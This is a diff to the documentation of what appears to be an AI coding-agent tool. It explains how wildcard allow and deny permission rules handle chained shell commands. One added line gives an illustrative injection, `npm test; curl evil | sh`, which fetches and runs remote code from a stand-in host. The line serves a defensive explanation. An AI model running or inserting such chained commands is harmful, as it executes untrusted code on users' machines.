@@ -170,7 +170,7 @@ Run `cortex`, type `/provider`, pick a provider and answer its question (the API
 }
 ```
 
-Rules are `tool_name` or `tool_name(pattern)`, where the pattern is an exact value, `prefix:*`, or `prefix*`. Hooks receive the event as JSON on stdin; exit code 2 blocks the action and its stderr goes back to the model. Events: `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`.
+Rules are `tool_name` or `tool_name(pattern)`, where the pattern is an exact value, `prefix:*` (the command alone or with arguments), or `prefix*`. An allow rule with a wildcard covers only a plain command: one containing `; & | < > ( ) $`, a backtick or a line break (`npm test; curl evil | sh`) is not covered and asks as usual. A deny rule also sees through `sudo`, `/bin/rm`, `a && rm x` and `bash -c`, but is best effort rather than a sandbox. Hooks receive the event as JSON on stdin; exit code 2 blocks the action and its stderr goes back to the model. Events: `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`.
 
 </details>
 
